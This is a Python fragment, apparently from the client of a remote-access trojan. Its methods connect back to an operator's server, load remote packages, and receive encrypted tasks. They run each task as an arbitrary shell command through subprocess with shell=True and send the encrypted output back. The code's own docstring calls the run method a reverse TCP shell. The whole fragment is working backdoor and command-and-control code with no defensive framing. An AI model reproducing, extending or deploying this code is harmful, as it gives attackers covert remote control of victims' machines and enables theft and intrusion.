            if self.flags.connection.wait(timeout=1.0):
                if 'encrypt_aes' in globals() and callable(globals()['encrypt_aes']) and any([i for i in globals().copy() if 'Crypto' in i]):
                    data = struct.pack('!L', 1) + globals()['encrypt_aes'](json.dumps(task), self.key)
                else:
                    data = struct.pack('!L', 0) + self.encrypt(json.dumps(task), self.key)
                msg  = struct.pack('!L', len(data)) + data
                while True:
                    sent = self.connection.send(msg)
                    if len(msg) - sent:
                        msg = msg[sent:]
                    else:
                        break
                return True
        return False

    def recv_task(self):
        """ 
        Receive and decrypt incoming task from server

        :returns dict task:
          :attr str uid:             task ID assigned by server
          :attr str session:         client ID assigned by server
          :attr str task:            task assigned by server
          :attr str result:          task result completed by client
          :attr datetime issued:     time task was issued by server
          :attr datetime completed:  time task was completed by client

        """
        hdr_len = struct.calcsize('!L')
        hdr     = self.connection.recv(hdr_len)
        msg_len = struct.unpack('!L', hdr)[0]
        msg     = self.connection.recv(msg_len)
        while len(msg) < msg_len:
            try:
                msg += self.connection.recv(msg_len - len(msg))
            except (socket.timeout, socket.error):
                break
        if isinstance(msg, bytes) and len(msg):
            data = decrypt_aes(msg, self.key)
            return json.loads(data)

    def run(self):
        """ 
        Connect back to server via outgoing connection
        and initialize a reverse TCP shell

        """
        try:
            for package in self.remote['packages']:
                if package not in globals():
                    self.remote_import(package)
            for target in ('prompt_handler','thread_handler'):
                if not bool(target in self.handlers and self.handlers[target].is_alive()):
                    self.handlers[target]  = getattr(self, '_get_{}'.format(target))()
            while True:
                if self.flags.connection.wait(timeout=1.0):
                    if not self.flags.prompt.is_set():
                        task = self.recv_task()
                        if isinstance(task, dict) and 'task' in task:
                            cmd, _, action = task['task'].encode().partition(' ')
                            try:
                                command = self._get_command(cmd)
                                result  = bytes(command(action) if action else command()) if command else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                            except Exception as e:
                                result  = "{} error: {}".format(self.run.func_name, str(e))
                            task.update({'result': result})
                            self.send_task(task)
                        self.flags.prompt.set()
                else:
                    debug("Connection timed out")
                    break
        except Exception as e:
            debug("{} error: {}".format(self.run.func_name, str(e)))
